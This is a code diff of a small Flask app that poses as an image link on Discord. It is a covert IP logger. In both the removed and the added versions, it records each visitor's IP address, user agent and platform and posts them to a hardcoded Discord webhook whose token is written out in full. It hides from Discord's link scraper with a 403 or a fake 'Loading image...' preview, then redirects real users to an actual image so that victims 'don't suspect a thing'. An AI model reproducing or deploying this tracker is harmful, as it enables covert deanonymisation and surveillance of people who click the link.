@@ -1,43 +1,25 @@
-from flask import Flask, request, redirect, render_template_string
-import requests
-
-app = Flask(__name__)
-
-# Tactical Endpoint: Where the intel is sent
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1499375993515802814/k7NlaKYQ6E9E89EvLFXmqYmQHzSldINIRkq3CZB2JqImHP4ROw7Wa2qbjLtFhgitQmKe'
-
-@app.route('/view/image_<id>.png')
-def capture_metadata(id):
-    # Analyzing headers to bypass the Discord Proxy
-    # If the request comes from Discord's bot, we show a 'Broken' state
-    user_agent = request.headers.get('User-Agent', '')
+@app.route('/view/image_01.png')
+def logger():
+    # 1. Grab the IP
+    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
-    if 'Discordbot' in user_agent:
-        # Returning a '403 Forbidden' to Discord's scraper
-        # This makes the image look 'Broken' in the client
-        return "Access Denied", 403
+    # 2. Send to Discord Webhook
+    payload = {"content": f"🎯 **Target Clicked!**\nIP: `{user_ip}`\nUser-Agent: `{request.user_agent}`"}
+    requests.post(WEBHOOK_URL, json=payload)
 
-    # If it's a real user clicking 'Open Original'
-    forwarded_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    platform = request.headers.get('Sec-CH-UA-Platform', 'Unknown')
+    # 3. The "Mask": This tells Discord to show a preview box
+    if "discord" in request.user_agent.lower():
+        return '''
+        <html>
+            <head>
+                <meta property="og:title" content="Loading image...">
+                <meta property="og:description" content="Click to open original">
+                <meta property="og:image" content="https://tenor.com/sv/view/loading-discord-loading-discord-boxes-squares-gif-16187521">
+                <meta name="twitter:card" content="summary_large_image">
+            </head>
+            <body></body>
+        </html>
+        '''
     
-    intel = {
-        "embeds": [{
-            "title": "🎯 Target Intercepted",
-            "color": 15158332,
-            "fields": [
-                {"name": "IP Address", "value": f"`{forwarded_ip.split(',')[0]}`", "inline": True},
-                {"name": "Device/OS", "value": f"`{platform}`", "inline": True},
-                {"name": "User-Agent", "value": f"```{user_agent}```"}
-            ]
-        }]
-    }
-    
-    # Sending intel to the Webhook
-    requests.post(WEBHOOK_URL, json=intel)
-
-    # Final Redirect: Send them to the actual image so they don't suspect a thing
+    # 4. The Redirect: Real people go to the image
     return redirect("https://i.imgur.com/BcNs5vF.jpg")
-
-if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=80)
